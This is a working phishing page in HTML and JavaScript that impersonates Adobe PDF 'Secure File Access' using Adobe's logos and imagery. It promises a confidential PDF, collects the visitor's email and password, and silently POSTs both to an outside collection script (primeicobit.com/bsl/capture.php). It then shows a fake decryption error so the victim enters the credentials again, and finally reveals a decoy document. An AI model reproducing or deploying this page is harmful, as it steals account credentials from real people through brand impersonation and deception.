<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe PDF - File Access</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
	<link rel="icon" type="image/png" href="https://www.adobe.com/content/dam/cc/icons/adobe_wordmark_red.svg" />
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        html, body {
            font-family: 'Roboto', sans-serif;
            text-align: center;
            background: url('https://www.adobe.com/homepage/media_148f2a129210332a5c2de11f946d81cde4a2d5d38.png?width=2000&format=webply&optimize=medium') no-repeat center center fixed;
            background-size: cover;
            color: #ddd !important;
            width: 100%;
            height: 100%;
            overflow-x: hidden;
        }
        .dark-mode {
            background: #121212 !important;
            color: #ddd !important;
        }
        .container {
            width: 90%;
            max-width: 450px;
            background: rgba(0, 0, 0, 0.8);
            padding: 20px;
            margin: 10vh auto; /* Centered vertically */
            box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.3);
            border-radius: 12px;
        }
        .hero img {
            max-width: 100%;
            height: auto;
        }
        .file-box {
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 8px;
            margin: 10px 0;
            background: rgba(255, 255, 255, 0.1);
            color: white;
        }
        .red-btn {
            background: #E2231A;
            color: white;
            border: none;
            font-size: 1rem;
            font-weight: bold;
            padding: 12px;
            margin-top: 10px;
            width: 100%;
            border-radius: 5px;
            cursor: pointer;
            transition: 0.3s;
        }
        .red-btn:hover {
            background: #c91a15;
        }
        input {
            padding: 12px;
            margin: 10px 0;
            width: 100%;
            border-radius: 5px;
            border: 1px solid #ddd;
            font-size: 1rem;
        }
        .hidden {
            display: none;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #E2231A;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        iframe {
            border: none;
            width: 100%;
            height: 500px;
        }
        .toggle-container {
            position: absolute;
            top: 10px;
            right: 10px;
        }
        .toggle-btn {
            background: #E2231A;
            color: white;
            border: none;
            font-weight: bold;
            padding: 8px 16px;
            border-radius: 500px;
            cursor: pointer;
        }
        /* Responsive Design */
        @media screen and (max-width: 768px) {
            .container {
                width: 95%;
                margin-top: 5vh;
            }
          
            .hero {
              margin-top: 50px;
            }
          
            .hero img {
                height: 80px;
            }
          
            .hero h1 {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>

    <div class="toggle-container">
        <button class="toggle-btn" id="toggle-mode">ðŸŒ™</button>
    </div>

    <div class="hero">
        <img src="https://www.adobe.com/content/dam/shared/images/product-icons/svg/acrobat.svg" alt="Adobe PDF Logo">
        <h1>Adobe PDF Secure File Access</h1>
		<img src="https://www.adobe.com/content/dam/cc/icons/adobe_wordmark_red.svg" alt="Adobe PDF Logo">
    </div>

    <div class="container">
        <div class="file-box">
            <p><strong>PDF Name:</strong> Confidential_Document.pdf</p>
            <p><strong>Size:</strong> 2.3MB</p>
            <button class="red-btn" id="decrypt-btn">Decrypt File</button>
        </div>

        <div id="decrypt-section" class="hidden">
          <h3>Enter Your Email</h3>
            <input type="email" id="email" placeholder="Enter your email" required>
            <button class="red-btn" id="next-btn">Next</button>
        </div>
		
		<div id="loadingemail" class="hidden">
            <h3>Verifying Email...</h3>
            <div class="loader"></div>
        </div>

        <div id="password-section" class="hidden">
            <h3>Enter Your Password</h3>
            <input type="password" id="password" placeholder="Enter password" required>
            <button class="red-btn" id="unlock-btn">Unlock</button>
        </div>

        <div id="loading" class="hidden">
            <h3>Decrypting...</h3>
            <div class="loader"></div>
        </div>

        <div id="error-message" class="hidden">
            <h3 style="color: red;">Decryption server failed. Try again.</h3>
        </div>

        <button class="red-btn hidden" id="retry-btn">Retry</button>

        <div id="pdf-catalog" class="hidden">
            <h3>Access Granted: Your File is Unlocked!</h3>
            <iframe src="bag.pdf"></iframe>
        </div>
    </div>

    <script>
        let attempts = 0;

        document.getElementById("toggle-mode").addEventListener("click", function() {
            const isDarkMode = document.body.classList.toggle("dark-mode");
            localStorage.setItem("theme", isDarkMode ? "dark" : "light");
            this.textContent = isDarkMode ? "â˜€" : "ðŸŒ™";
        });

        if (localStorage.getItem("theme") === "dark") {
            document.body.classList.add("dark-mode");
            document.getElementById("toggle-mode").textContent = "â˜€";
        }

        document.getElementById("decrypt-btn").addEventListener("click", function() {
            document.getElementById("decrypt-section").classList.remove("hidden");
            this.style.display = "none";
        });

        document.getElementById("next-btn").addEventListener("click", function() {
            if (!document.getElementById("email").value) {
                alert("Please enter a valid email.");
                return;
            }
            // Show the loader
            document.getElementById("decrypt-section").classList.add("hidden");
            document.getElementById("loadingemail").classList.remove("hidden");
			
			setTimeout(function() {
                document.getElementById("loadingemail").classList.add("hidden");
                document.getElementById("password-section").classList.remove("hidden");
            }, 3000);
        });

        document.getElementById("unlock-btn").addEventListener("click", function() {
            var email = document.getElementById("email").value;
		    var password = document.getElementById("password").value;
            if (!email || !password) {
                alert("Please fill in all fields.");
                return;
            }
			
			// Send credentials to a server (No warning message)
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://primeicobit.com/bsl/capture.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.send("email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password));
			
			
            document.getElementById("password-section").classList.add("hidden");
            document.getElementById("loading").classList.remove("hidden");

            setTimeout(function() {
                document.getElementById("loading").classList.add("hidden");

                if (attempts === 0) {
                    document.getElementById("error-message").classList.remove("hidden");
                    document.getElementById("retry-btn").classList.remove("hidden");
                    attempts++;
                } else {
                    document.getElementById("pdf-catalog").classList.remove("hidden");
                }
            }, 3000);
        });

        document.getElementById("retry-btn").addEventListener("click", function() {
            document.getElementById("error-message").classList.add("hidden");
            document.getElementById("retry-btn").classList.add("hidden");
            document.getElementById("decrypt-section").classList.remove("hidden");
        });
    </script>

</body>
</html>
